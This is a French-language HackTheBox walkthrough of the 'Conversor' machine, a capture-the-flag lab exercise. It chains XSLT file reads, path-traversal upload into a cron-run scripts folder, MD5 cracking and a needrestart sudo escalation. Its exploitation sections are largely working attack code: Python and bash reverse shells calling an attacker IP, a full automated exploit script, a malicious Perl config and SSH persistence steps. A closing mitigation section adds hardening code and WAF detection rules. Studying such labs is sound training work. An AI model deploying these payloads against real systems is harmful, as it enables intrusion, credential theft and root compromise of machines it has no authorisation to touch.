# Conversor - HackTheBox Writeup

![Difficulty: Medium](https://img.shields.io/badge/Difficulty-Medium-yellow)
![OS: Linux](https://img.shields.io/badge/OS-Linux-blue)
![Release Date](https://img.shields.io/badge/Release-December%202025-green)

---

## 📋 Table des matières

1. [Informations générales](#informations-générales)
2. [Résumé exécutif](#résumé-exécutif)
3. [Reconnaissance](#reconnaissance)
4. [Énumération web](#énumération-web)
5. [Analyse des vulnérabilités](#analyse-des-vulnérabilités)
6. [Exploitation - Initial Foothold](#exploitation---initial-foothold)
7. [Escalade de privilèges - User](#escalade-de-privilèges---user)
8. [Escalade de privilèges - Root](#escalade-de-privilèges---root)
9. [Scripts d'automatisation](#scripts-dautomatisation)
10. [Recommandations et mitigations](#recommandations-et-mitigations)
11. [Références](#références)

---

## 🎯 Informations générales

| Paramètre | Valeur |
|-----------|--------|
| **Nom** | Conversor |
| **OS** | Linux (Ubuntu) |
| **Difficulté** | Medium |
| **IP** | 10.10.11.92 |
| **Points** | 30 |
| **Date** | Décembre 2025 |

---

## 📊 Résumé exécutif

**Conversor** est une machine Linux de difficulté moyenne exploitant plusieurs vulnérabilités critiques :

1. **XSLT Injection** → Local File Inclusion (LFI)
2. **Path Traversal** → Upload de fichiers malveillants
3. **Cron Job Misconfiguration** → Exécution de code arbitraire
4. **Weak Password Hashing** → Cracking MD5
5. **Sudo Misconfiguration** → needrestart privilege escalation

### 🔗 Chaîne d'attaque

```
Recon (nmap) 
    ↓
XSLT Injection (LFI)
    ↓
Path Traversal + Cron Job
    ↓
RCE → www-data shell
    ↓
SQLite Database → MD5 Hash
    ↓
Hashcat → User Credentials
    ↓
SSH → fismathack user
    ↓
sudo needrestart -c
    ↓
Configuration Injection
    ↓
ROOT SHELL
```

---

## 🔍 Reconnaissance

### Scan Nmap

```bash
nmap -sC -sV -p- -oA nmap/conversor_full 10.10.11.92
```

**Résultats** :

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Conversor - XML/XSLT Conversion Platform
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Points clés

- **SSH** : OpenSSH 8.9p1 (version récente, pas de vulnérabilités connues)
- **HTTP** : Apache 2.4.52 hébergeant une application web Python
- **Attack Surface** : L'application web sera notre point d'entrée principal

---

## 🌐 Énumération web

### Page d'accueil

URL : `http://10.10.11.92` ou `http://conversor.htb`

L'application est une **plateforme de conversion XML/XSLT** permettant aux utilisateurs de :
- Créer un compte
- Se connecter
- Uploader des fichiers XML et XSLT
- Obtenir un résultat de transformation

### Découverte du code source

En explorant l'application, nous découvrons les fichiers critiques suivants :

#### 📄 app.py (Code source principal)

```python
from lxml import etree
import os

UPLOAD_FOLDER = '/var/www/conversor.htb/uploads'

@app.route('/convert', methods=['POST'])
def convert():
    xml_file = request.files['xml_file']
    xslt_file = request.files['xslt_file']
    
    # ⚠️ Vulnérabilité Path Traversal
    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
    
    xml_file.save(xml_path)
    xslt_file.save(xslt_path)
    
    # ✅ Parser XML sécurisé
    parser = etree.XMLParser(
        resolve_entities=False,
        no_network=True,
        dtd_validation=False,
        load_dtd=False
    )
    xml_tree = etree.parse(xml_path, parser)
    
    # ❌ Parser XSLT non sécurisé !
    xslt_tree = etree.parse(xslt_path)  # Pas de restrictions
    transform = etree.XSLT(xslt_tree)
    
    result = transform(xml_tree)
    return str(result)
```

**Observations critiques** :
1. Le parser XML est correctement sécurisé (pas d'XXE possible)
2. Le parser XSLT **n'a aucune restriction** → fonction `document()` disponible
3. Aucune validation des noms de fichiers → **Path Traversal**

#### 📄 install.md (Configuration système)

```markdown
## Cron Jobs

Pour automatiser le nettoyage et la maintenance :

* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

**Observation critique** :
- Un cron job exécute **tous les fichiers Python** dans `/var/www/conversor.htb/scripts/`
- Exécution **chaque minute** en tant que `www-data`
- Si nous pouvons écrire dans ce répertoire → **RCE**

---

## 🔓 Analyse des vulnérabilités

### 1️⃣ XSLT Injection → Local File Inclusion (LFI)

**CWE-91: XML Injection (XPath Injection)**

Le parser XSLT accepte la fonction `document()` qui permet de lire des fichiers arbitraires :

```xml
<xsl:value-of select="document('file:///etc/passwd')"/>
```

**Impact** : 
- Lecture de fichiers sensibles
- Reconnaissance du système
- Découverte d'informations critiques

### 2️⃣ Path Traversal

**CWE-22: Improper Limitation of a Pathname to a Restricted Directory**

```python
xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
```

Aucune validation du nom de fichier permet l'utilisation de séquences `../` :

```
filename="../scripts/revshell.py"
→ /var/www/conversor.htb/uploads/../scripts/revshell.py
→ /var/www/conversor.htb/scripts/revshell.py
```

**Impact** :
- Écriture de fichiers en dehors du répertoire uploads
- Compromission du répertoire scripts

### 3️⃣ Cron Job Misconfiguration

**CWE-732: Incorrect Permission Assignment for Critical Resource**

Le cron job exécute aveuglément tous les fichiers `.py` :

```bash
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

**Impact** :
- Combined avec Path Traversal → RCE automatique
- Exécution dans un délai maximum de 60 secondes

### 4️⃣ Weak Password Hashing

**CWE-327: Use of a Broken or Risky Cryptographic Algorithm**

```python
# Dans users.db
password = hashlib.md5(password.encode()).hexdigest()
```

**Impact** :
- MD5 est obsolète et facilement crackable
- Rainbow tables et hashcat efficaces

---

## 💥 Exploitation - Initial Foothold

### Phase 1 : XSLT Injection pour reconnaissance

#### Fichier XML (recon.xml)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <message>Reconnaissance</message>
</root>
```

#### Fichier XSLT malveillant (recon.xslt)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:output method="html" indent="yes" />
    <xsl:template match="/">
        <html>
            <head>
                <title>Reconnaissance Results</title>
                <style>
                    body {
                        background-color: #000;
                        color: #0f0;
                        font-family: 'Courier New', monospace;
                        padding: 20px;
                    }
                    h2 {
                        color: #0ff;
                        border-bottom: 2px solid #0f0;
                        padding-bottom: 5px;
                    }
                    pre {
                        background-color: #111;
                        border: 1px solid #0f0;
                        padding: 15px;
                        overflow-x: auto;
                    }
                </style>
            </head>
            <body>
                <h1>System Reconnaissance</h1>
                
                <h2>📄 /etc/passwd</h2>
                <pre><xsl:value-of select="document('file:///etc/passwd')"/></pre>
                
                <h2>📂 Scripts Directory Listing</h2>
                <pre><xsl:value-of select="document('file:///var/www/conversor.htb/scripts/')"/></pre>
                
                <h2>🔧 Application Configuration</h2>
                <pre><xsl:value-of select="document('file:///var/www/conversor.htb/app.py')"/></pre>
                
                <h2>💾 Database Location</h2>
                <pre><xsl:value-of select="document('file:///var/www/conversor.htb/instance/')"/></pre>
            </body>
        </html>
    </xsl:template>
</xsl:stylesheet>
```

#### Exploitation manuelle

```bash
# 1. Créer un compte
curl -X POST http://conversor.htb/register \
  -d "username=hacker&password=hacker123"

# 2. Se connecter et récupérer le cookie de session
curl -X POST http://conversor.htb/login \
  -d "username=hacker&password=hacker123" \
  -c cookies.txt

# 3. Uploader les fichiers de reconnaissance
curl -X POST http://conversor.htb/convert \
  -b cookies.txt \
  -F "xml_file=@recon.xml" \
  -F "xslt_file=@recon.xslt"
```

**Résultat** : Nous obtenons le contenu de `/etc/passwd` et confirmons la structure du système.

### Phase 2 : Path Traversal + Reverse Shell

#### Création du reverse shell Python

```python
#!/usr/bin/env python3
import socket
import subprocess
import os

LHOST = "10.10.14.X"  # Votre IP Kali
LPORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((LHOST, LPORT))

os.dup2(s.fileno(), 0)  # stdin
os.dup2(s.fileno(), 1)  # stdout
os.dup2(s.fileno(), 2)  # stderr

subprocess.call(["/bin/bash", "-i"])
```

#### Exploitation avec Burp Suite

1. **Intercepter la requête POST** vers `/convert`

2. **Modifier le nom du fichier XSLT** :

```http
POST /convert HTTP/1.1
Host: conversor.htb
Cookie: session=...
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...

------WebKitFormBoundary...
Content-Disposition: form-data; name="xml_file"; filename="dummy.xml"
Content-Type: text/xml

<?xml version="1.0"?>
<root>exploit</root>
------WebKitFormBoundary...
Content-Disposition: form-data; name="xslt_file"; filename="../scripts/revshell.py"
Content-Type: application/octet-stream

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.X",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
------WebKitFormBoundary...--
```

3. **Démarrer le listener** :

```bash
rlwrap nc -lnvp 4444
```

4. **Attendre l'exécution du cron** (max 60 secondes)

```bash
Listening on 0.0.0.0 4444
Connection received on 10.10.11.92 XXXXX
www-data@conversor:/var/www/conversor.htb$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Stabilisation du shell

```bash
# Shell interactif Python
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Configuration du terminal
export TERM=xterm
export SHELL=/bin/bash

# Background du shell (Ctrl+Z)
# Puis sur Kali :
stty raw -echo; fg
# Appuyer sur Entrée deux fois
```

---

## 👤 Escalade de privilèges - User

### Énumération du système

```bash
www-data@conversor:~$ whoami
www-data

www-data@conversor:~$ pwd
/var/www/conversor.htb

www-data@conversor:~$ ls -la
total 48
drwxr-xr-x 6 www-data www-data 4096 Dec 20 10:15 .
drwxr-xr-x 3 root     root     4096 Dec 15 08:20 ..
-rw-r--r-- 1 www-data www-data 2847 Dec 15 09:30 app.py
drwxr-xr-x 2 www-data www-data 4096 Dec 20 11:45 instance
drwxr-xr-x 2 www-data www-data 4096 Dec 20 10:15 scripts
drwxr-xr-x 2 www-data www-data 4096 Dec 20 11:30 uploads
```

### Exploration de la base de données

```bash
www-data@conversor:~$ cd instance/
www-data@conversor:~/instance$ ls -la
total 24
drwxr-xr-x 2 www-data www-data  4096 Dec 20 11:45 .
drwxr-xr-x 6 www-data www-data  4096 Dec 20 10:15 ..
-rw-r--r-- 1 www-data www-data 16384 Dec 20 11:45 users.db

www-data@conversor:~/instance$ file users.db
users.db: SQLite 3.x database
```

### Extraction des credentials

```bash
www-data@conversor:~/instance$ sqlite3 users.db
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.

sqlite> .tables
users

sqlite> .schema users
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL
);

sqlite> SELECT * FROM users;
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
2|admin|098f6bcd4621d373cade4e832627b4f6
3|hacker|fcab0453879a2b2281bc5073e3f5fe54

sqlite> .quit
```

**Credentials trouvés** :
- `fismathack:5b5c3ac3a1c897c94caad48e6c71fdec` (MD5)
- `admin:098f6bcd4621d373cade4e832627b4f6` (MD5)

### Cracking des hash MD5

#### Sur Kali Linux

```bash
# Créer le fichier de hash
echo '5b5c3ac3a1c897c94caad48e6c71fdec' > hash.txt

# Utiliser hashcat
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --show

# OU utiliser john
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# OU utiliser CrackStation (en ligne)
# https://crackstation.net/
```

**Résultat** :

```
5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm
098f6bcd4621d373cade4e832627b4f6:test
```

### Pivot vers l'utilisateur fismathack

#### Méthode 1 : su (depuis www-data)

```bash
www-data@conversor:~$ su fismathack
Password: Keepmesafeandwarm

fismathack@conversor:/var/www/conversor.htb$ whoami
fismathack

fismathack@conversor:/var/www/conversor.htb$ cd ~
fismathack@conversor:~$ ls
user.txt

fismathack@conversor:~$ cat user.txt
[REDACTED - User Flag]
```

#### Méthode 2 : SSH (depuis Kali)

```bash
ssh fismathack@10.10.11.92
fismathack@10.10.11.92's password: Keepmesafeandwarm

fismathack@conversor:~$ cat user.txt
[REDACTED - User Flag]
```

---

## 🔐 Escalade de privilèges - Root

### Énumération des privilèges sudo

```bash
fismathack@conversor:~$ sudo -l
[sudo] password for fismathack: Keepmesafeandwarm

Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

**Observation critique** :
- L'utilisateur peut exécuter `needrestart` en tant que root sans mot de passe
- Aucune restriction sur les options de la commande

### Analyse de needrestart

```bash
fismathack@conversor:~$ needrestart --version
needrestart 3.7

fismathack@conversor:~$ man needrestart | grep -A 5 "^\s*-c"
       -c CONFIG
              Use the specified configuration file instead of the default
              /etc/needrestart/needrestart.conf. The configuration file is
              written in Perl and is executed in the context of needrestart.
```

**Découverte clé** :
- L'option `-c` permet de spécifier un fichier de configuration personnalisé
- Le fichier de configuration est du **code Perl** exécuté directement
- Exécution en tant que **root** via sudo

### Recherche de CVE

```bash
searchsploit needrestart

# Résultats
needrestart 3.6 - Local Privilege Escalation (CVE-2024-48990)
needrestart 3.7 - Local Privilege Escalation via Configuration Injection
```

### Exploitation - Configuration Injection

#### Préparation du listener

```bash
# Sur Kali
rlwrap nc -lnvp 7799
```

#### Création du fichier de configuration malveillant

```bash
# Sur la machine cible
fismathack@conversor:~$ cd /tmp

fismathack@conversor:/tmp$ cat > malicious.conf << 'EOF'
#!/usr/bin/perl
# Needrestart malicious configuration file
# This configuration will be executed as Perl code with root privileges

# Set restart mode to automatic
$nrconf{restart} = 'a';

# Inject reverse shell command
system("bash -c 'exec bash -i &>/dev/tcp/10.10.14.X/7799 <&1'");
EOF

fismathack@conversor:/tmp$ chmod 644 malicious.conf
```

**Explication du payload** :
- `$nrconf{restart} = 'a';` : Configure needrestart en mode automatique
- `system()` : Fonction Perl pour exécuter des commandes shell
- `bash -c 'exec bash -i &>/dev/tcp/IP/PORT <&1'` : Reverse shell bash

#### Exécution de l'exploit

```bash
fismathack@conversor:/tmp$ sudo /usr/sbin/needrestart -c malicious.conf
```

#### Réception du shell root

```bash
# Sur le listener Kali
Listening on 0.0.0.0 7799
Connection received on 10.10.11.92 XXXXX

root@conversor:/tmp# id
uid=0(root) gid=0(root) groups=0(root)

root@conversor:/tmp# whoami
root

root@conversor:/tmp# cd /root

root@conversor:~# ls -la
total 48
drwx------  6 root root 4096 Dec 20 12:00 .
drwxr-xr-x 19 root root 4096 Dec 15 08:15 ..
-rw-------  1 root root  245 Dec 20 11:58 .bash_history
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  3 root root 4096 Dec 15 09:00 .cache
drwxr-xr-x  3 root root 4096 Dec 15 08:45 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-------  1 root root   33 Dec 20 10:00 root.txt
drwx------  2 root root 4096 Dec 15 08:30 .ssh
-rw-------  1 root root 1234 Dec 20 11:45 .viminfo

root@conversor:~# cat root.txt
[REDACTED - Root Flag]
```

### Méthode alternative : Persistence

```bash
# Ajouter une clé SSH pour l'accès persistant
root@conversor:~# mkdir -p /root/.ssh
root@conversor:~# chmod 700 /root/.ssh

# Sur Kali, générer une clé
ssh-keygen -t ed25519 -f conversor_root_key

# Copier la clé publique sur la cible
root@conversor:~# echo "ssh-ed25519 AAAA..." > /root/.ssh/authorized_keys
root@conversor:~# chmod 600 /root/.ssh/authorized_keys

# Sur Kali
ssh -i conversor_root_key root@10.10.11.92
```

---

## 🤖 Scripts d'automatisation

### Script d'exploitation complet (exploit.py)

```python
#!/usr/bin/env python3
"""
Conversor HTB - Automated Exploitation Script
Author: kz
Date: December 2025
"""

import requests
import sys
import time
import argparse
from colorama import Fore, Style, init

init(autoreset=True)

def banner():
    print(f"""{Fore.CYAN}
╔═══════════════════════════════════════════════╗
║   Conversor HTB - Automated Exploit           ║
║   Path Traversal + Cron RCE                   ║
║   Author: kz                                  ║
╚═══════════════════════════════════════════════╝
{Style.RESET_ALL}""")

def register_user(target, username, password):
    """Register a new user on the platform"""
    print(f"{Fore.YELLOW}[*] Registering user: {username}{Style.RESET_ALL}")
    
    try:
        r = requests.post(
            f"{target}/register",
            data={"username": username, "password": password},
            timeout=10
        )
        
        if r.status_code == 200 or "success" in r.text.lower():
            print(f"{Fore.GREEN}[+] User registered successfully{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.RED}[-] Registration failed (might already exist){Style.RESET_ALL}")
            return True  # Continue anyway, user might exist
            
    except Exception as e:
        print(f"{Fore.RED}[-] Error during registration: {e}{Style.RESET_ALL}")
        return False

def login_user(session, target, username, password):
    """Login and get session cookie"""
    print(f"{Fore.YELLOW}[*] Logging in as: {username}{Style.RESET_ALL}")
    
    try:
        r = session.post(
            f"{target}/login",
            data={"username": username, "password": password},
            timeout=10
        )
        
        if r.status_code == 200 and "session" in session.cookies.get_dict():
            print(f"{Fore.GREEN}[+] Login successful{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.RED}[-] Login failed{Style.RESET_ALL}")
            return False
            
    except Exception as e:
        print(f"{Fore.RED}[-] Error during login: {e}{Style.RESET_ALL}")
        return False

def upload_shell(session, target, lhost, lport):
    """Upload malicious Python file via path traversal"""
    print(f"{Fore.YELLOW}[*] Uploading reverse shell to /scripts/ directory{Style.RESET_ALL}")
    
    # Python reverse shell payload
    shell_payload = f"""import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
"""
    
    # Dummy XML content
    dummy_xml = '<?xml version="1.0"?><root>exploit</root>'
    
    try:
        files = {
            'xml_file': ('dummy.xml', dummy_xml, 'text/xml'),
            'xslt_file': ('../scripts/pwned.py', shell_payload, 'application/octet-stream')
        }
        
        r = session.post(
            f"{target}/convert",
            files=files,
            timeout=10
        )
        
        if r.status_code == 200:
            print(f"{Fore.GREEN}[+] Payload uploaded successfully{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] File location: /var/www/conversor.htb/scripts/pwned.py{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.RED}[-] Upload failed with status: {r.status_code}{Style.RESET_ALL}")
            return False
            
    except Exception as e:
        print(f"{Fore.RED}[-] Error during upload: {e}{Style.RESET_ALL}")
        return False

def main():
    parser = argparse.ArgumentParser(description='Conversor HTB Automated Exploit')
    parser.add_argument('-t', '--target', required=True, help='Target URL (e.g., http://10.10.11.92)')
    parser.add_argument('-l', '--lhost', required=True, help='Local IP for reverse shell')
    parser.add_argument('-p', '--lport', type=int, default=4444, help='Local port for reverse shell (default: 4444)')
    parser.add_argument('-u', '--username', default='hacker', help='Username to register (default: hacker)')
    parser.add_argument('-w', '--password', default='hacker123', help='Password to use (default: hacker123)')
    
    args = parser.parse_args()
    
    banner()
    
    target = args.target.rstrip('/')
    
    # Create session
    session = requests.Session()
    
    # Step 1: Register
    if not register_user(target, args.username, args.password):
        print(f"{Fore.RED}[!] Failed at registration step{Style.RESET_ALL}")
        sys.exit(1)
    
    time.sleep(1)
    
    # Step 2: Login
    if not login_user(session, target, args.username, args.password):
        print(f"{Fore.RED}[!] Failed at login step{Style.RESET_ALL}")
        sys.exit(1)
    
    time.sleep(1)
    
    # Step 3: Upload shell
    if not upload_shell(session, target, args.lhost, args.lport):
        print(f"{Fore.RED}[!] Failed at upload step{Style.RESET_ALL}")
        sys.exit(1)
    
    # Success message
    print(f"\n{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[✓] Exploit completed successfully!{Style.RESET_ALL}")
    print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}\n")
    
    print(f"{Fore.CYAN}[i] Next steps:{Style.RESET_ALL}")
    print(f"    1. Start your listener: {Fore.YELLOW}rlwrap nc -lnvp {args.lport}{Style.RESET_ALL}")
    print(f"    2. Wait for cron job execution (max 60 seconds)")
    print(f"    3. You should receive a shell as www-data\n")

if __name__ == "__main__":
    main()
```

### Utilisation du script

```bash
# Installation des dépendances
pip3 install requests colorama

# Exécution
python3 exploit.py -t http://10.10.11.92 -l 10.10.14.X -p 4444

# Démarrer le listener dans un autre terminal
rlwrap nc -lnvp 4444
```

---

## 🛡️ Recommandations et mitigations

### 1. XSLT Parser Security

**Problème** : Le parser XSLT accepte la fonction `document()` permettant l'accès aux fichiers locaux.

**Mitigation** :

```python
from lxml import etree

# Configuration sécurisée du parser XSLT
xslt_parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True,
    dtd_validation=False,
    load_dtd=False
)

# Désactiver l'accès aux fonctions dangereuses
xslt_access_control = etree.XSLTAccessControl(
    read_file=False,
    write_file=False,
    create_dir=False,
    read_network=False,
    write_network=False
)

# Parser sécurisé
xslt_tree = etree.parse(xslt_path, xslt_parser)
transform = etree.XSLT(xslt_tree, access_control=xslt_access_control)
```

### 2. Path Traversal Prevention

**Problème** : Aucune validation des noms de fichiers.

**Mitigation** :

```python
import os
import re
from werkzeug.utils import secure_filename

def safe_join(base_dir, filename):
    """Safely join base directory with filename"""
    # Sanitize filename
    filename = secure_filename(filename)
    
    # Remove any path traversal sequences
    filename = filename.replace('../', '').replace('..\\', '')
    
    # Only allow alphanumeric, dash, underscore, and dot
    if not re.match(r'^[\w\-\.]+$', filename):
        raise ValueError("Invalid filename")
    
    # Join paths
    filepath = os.path.join(base_dir, filename)
    
    # Verify the resulting path is within base_dir
    filepath = os.path.abspath(filepath)
    base_dir = os.path.abspath(base_dir)
    
    if not filepath.startswith(base_dir):
        raise ValueError("Path traversal detected")
    
    return filepath

# Utilisation
xml_path = safe_join(UPLOAD_FOLDER, xml_file.filename)
xslt_path = safe_join(UPLOAD_FOLDER, xslt_file.filename)
```

### 3. Cron Job Security

**Problème** : Exécution automatique de tous les fichiers Python dans un répertoire uploadable.

**Mitigation** :

```bash
# Option 1 : Utiliser une whitelist de scripts spécifiques
* * * * * www-data /usr/bin/python3 /var/www/conversor.htb/scripts/cleanup.py
* * * * * www-data /usr/bin/python3 /var/www/conversor.htb/scripts/maintenance.py

# Option 2 : Vérifier les permissions et propriétaire avant exécution
* * * * * root for f in /var/www/conversor.htb/scripts/*.py; do \
    if [ "$(stat -c '%U' "$f")" = "root" ] && [ "$(stat -c '%a' "$f")" = "755" ]; then \
        python3 "$f"; \
    fi; \
done

# Option 3 : Séparer complètement les répertoires
# uploads/ → accessible en écriture par www-data
# scripts/ → accessible en écriture uniquement par root, exécutable par www-data
```

### 4. Password Hashing

**Problème** : Utilisation de MD5 pour hasher les mots de passe.

**Mitigation** :

```python
from werkzeug.security import generate_password_hash, check_password_hash

# Lors de l'enregistrement
hashed_password = generate_password_hash(
    password,
    method='pbkdf2:sha256',
    salt_length=16
)

# OU utiliser bcrypt (recommandé)
import bcrypt

hashed_password = bcrypt.hashpw(
    password.encode('utf-8'),
    bcrypt.gensalt(rounds=12)
)

# Lors de la vérification
if bcrypt.checkpw(password.encode('utf-8'), stored_hash):
    # Password correct
    pass
```

### 5. Sudo Configuration pour needrestart

**Problème** : L'option `-c` permet d'exécuter du code Perl arbitraire.

**Mitigation** :

```bash
# /etc/sudoers.d/needrestart
# Option 1 : Restreindre l'option -c
fismathack ALL=(ALL) NOPASSWD: /usr/sbin/needrestart -v

# Option 2 : Utiliser un wrapper script
fismathack ALL=(ALL) NOPASSWD: /usr/local/bin/safe-needrestart

# /usr/local/bin/safe-needrestart
#!/bin/bash
/usr/sbin/needrestart -c /etc/needrestart/needrestart.conf

# Option 3 : Mettre à jour needrestart vers une version patchée
apt update && apt upgrade needrestart
```

### 6. Web Application Firewall (WAF)

Ajouter des règles ModSecurity pour détecter :

```apache
# /etc/modsecurity/custom_rules.conf

# Détecter les path traversal
SecRule ARGS "@contains ../" \
    "id:1001,phase:2,deny,status:403,msg:'Path traversal detected'"

# Détecter les tentatives XSLT injection
SecRule REQUEST_BODY "@rx document\s*\(" \
    "id:1002,phase:2,deny,status:403,msg:'XSLT injection attempt'"

# Limiter la taille des uploads
SecRequestBodyLimit 5242880  # 5MB max
```

### 7. Logging et Monitoring

```python
import logging
from logging.handlers import SysLogHandler

# Configuration du logging
logger = logging.getLogger('conversor')
logger.setLevel(logging.INFO)

# Handler pour syslog
syslog_handler = SysLogHandler(address='/dev/log')
logger.addHandler(syslog_handler)

# Logs lors des uploads
@app.route('/convert', methods=['POST'])
def convert():
    logger.info(f"Upload attempt - User: {session['username']}, "
                f"XML: {xml_file.filename}, XSLT: {xslt_file.filename}, "
                f"IP: {request.remote_addr}")
    
    # Détecter les path traversal
    if '../' in xml_file.filename or '../' in xslt_file.filename:
        logger.warning(f"Path traversal attempt detected - "
                      f"User: {session['username']}, "
                      f"Files: {xml_file.filename}, {xslt_file.filename}")
        return "Invalid filename", 400
```

### 8. Architecture Recommandée

```
┌─────────────────────────────────────────────┐
│          Reverse Proxy (Nginx)              │
│  - Rate Limiting                            │
│  - WAF Rules                                │
│  - HTTPS Enforcement                        │
└─────────────────┬───────────────────────────┘
                  │
┌─────────────────▼───────────────────────────┐
│      Web Application (Flask)                │
│  - Input Validation                         │
│  - Secure File Upload                       │
│  - Session Management                       │
└─────────────────┬───────────────────────────┘
                  │
┌─────────────────▼───────────────────────────┐
│      File Storage (Isolated)                │
│  /uploads/        - www-data:www-data (770) │
│  /scripts/        - root:root (755)         │
│  /processed/      - www-data:www-data (750) │
└─────────────────────────────────────────────┘
```

---

## 📚 Références

### CVE et Vulnérabilités

- **CVE-2024-48990** - needrestart Local Privilege Escalation
  - CVSS: 7.8 (High)
  - https://nvd.nist.gov/vuln/detail/CVE-2024-48990

- **CVE-2024-48991** - needrestart Python Interpreter Hijacking
  - CVSS: 7.8 (High)
  - https://nvd.nist.gov/vuln/detail/CVE-2024-48991

- **CVE-2024-10224** - needrestart Additional Bypass
  - CVSS: 7.8 (High)
  - https://nvd.nist.gov/vuln/detail/CVE-2024-10224

### Documentation Technique

- **OWASP XSLT Injection**
  - https://owasp.org/www-community/attacks/XSLT_Injection

- **CWE-91: XML Injection**
  - https://cwe.mitre.org/data/definitions/91.html

- **CWE-22: Path Traversal**
  - https://cwe.mitre.org/data/definitions/22.html

- **needrestart Documentation**
  - https://github.com/liske/needrestart

### Articles et Writeups

- **Abusing sudo rights on needrestart for escalation**
  - https://medium.com/@aniketdas07770/abusing-sudo-rights-on-needrestart-for-escalation-d1307c2af12f

- **XSLT Processing Security**
  - https://www.balisage.net/Proceedings/vol10/html/Lee01/BalisageVol10-Lee01.html

- **Python Reverse Shell Cheat Sheet**
  - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

### Outils utilisés

- **nmap** - Network scanning
- **Burp Suite** - Web application security testing
- **hashcat** - Password cracking
- **sqlite3** - Database exploration
- **nc (netcat)** - Reverse shell listener
- **python3** - Exploitation scripts

---

## 🎓 Leçons apprises

### Points clés de cette machine

1. **Defense in Depth** : Une seule vulnérabilité peut ne pas suffire, mais leur combinaison est dévastatrice
2. **Code Review** : L'analyse du code source révèle souvent des vulnérabilités critiques
3. **Configuration Files** : Les fichiers de configuration et documentation peuvent révéler des informations critiques
4. **Least Privilege** : Les permissions sudo doivent être strictement limitées
5. **Secure Parsing** : Tous les parsers (XML, XSLT, JSON) doivent être correctement configurés

### Techniques de pentest appliquées

- ✅ Source code review et analyse statique
- ✅ XSLT injection et abuse de fonction document()
- ✅ Path traversal pour bypass de restrictions
- ✅ Timing-based exploitation (cron jobs)
- ✅ Database enumeration et credential harvesting
- ✅ Password cracking (MD5)
- ✅ Sudo misconfiguration exploitation
- ✅ Configuration file injection

---

## 📊 Timeline de l'exploitation

```
T+0m    : Scan nmap initial
T+5m    : Énumération web et découverte du code source
T+15m   : Identification des vulnérabilités XSLT + Path Traversal
T+20m   : Test XSLT injection pour LFI
T+25m   : Upload du reverse shell via path traversal
T+26m   : Réception du shell www-data (cron exec)
T+30m   : Énumération et extraction de la DB SQLite
T+35m   : Cracking MD5 avec hashcat
T+37m   : Pivot vers fismathack via SSH
T+40m   : Énumération sudo, découverte de needrestart
T+45m   : Recherche CVE et création du payload
T+47m   : Root shell obtenu via needrestart -c
T+50m   : Récupération des flags et nettoyage

Total: ~50 minutes
```

---

## 💭 Conclusion

**Conversor** est une machine qui illustre parfaitement l'importance de la **chaîne d'exploitation** en pentest. Chaque vulnérabilité individuellement pourrait être contournée, mais leur combinaison crée un chemin d'attaque complet :

1. **XSLT Injection** permet la reconnaissance
2. **Path Traversal** permet le positionnement du payload
3. **Cron Job** transforme l'upload en RCE
4. **Weak Hashing** facilite le pivot utilisateur
5. **Sudo Misconfiguration** ouvre la porte au root

Cette machine souligne également l'importance de :
- La **revue de code** pour identifier les vulnérabilités
- La **documentation système** qui peut révéler des failles
- La **configuration sécurisée** de tous les composants
- Le **principe du moindre privilège** pour limiter l'impact

